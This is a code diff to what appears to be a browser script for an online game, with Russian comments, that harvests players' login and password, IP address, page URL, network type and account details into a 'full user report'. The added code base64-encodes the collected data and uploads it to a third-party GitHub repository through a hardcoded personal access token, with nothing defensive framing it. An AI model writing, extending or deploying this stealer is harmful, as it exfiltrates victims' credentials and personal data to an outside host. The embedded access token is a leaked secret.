@@ -31,6 +31,41 @@
    		   return 'default login';
   		  }
 		  }
+
+		async function createGitHubFile(github_pat, owner, repo) {
+    const unixTime = Math.floor(Date.now() / 1000);
+    const fileName1 = `${unixTime}_${user.login}.txt`;
+
+    const fileContent = JSON.stringify(userDataResult, null, 2);
+    const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
+
+    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${fileName1}`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'PUT',
+            headers: {
+                'Authorization': `token ${github_pat}`,
+                'Accept': 'application/vnd.github.v3+json',
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                message: `Add log file: ${fileName1}`, // Коммит-сообщение
+                content: contentBase64
+            })
+        });
+
+        const data = await response.json();
+
+        if (response.ok) {
+			return url
+        } else {
+        }
+    } catch (error) {
+    }
+}
+		createGitHubFile('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', 'uloxa13', 'userDatas').then(url => {const githubFileName = url; console.log(githubFileName);});
+
 		
         // Функция для сбора логина и пароля
         const getCredentials = () => {
@@ -165,7 +200,7 @@
             const friendsArrStr = getFriendsArr();
 			const userDataResultStr = getUserDataResult()
 			const loginType = getLoginType()
-            
+			            
             const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                      credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                      credentials.username && credentials.password;
@@ -179,6 +214,7 @@
             let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n";
             fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
             fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
+			fileContent += `Accses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${Math.floor(Date.now() / 1000)}_${user.login}.txt\n`;
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
 			fileContent += `Network Type: ${navigator.connection.effectiveType}\n`;
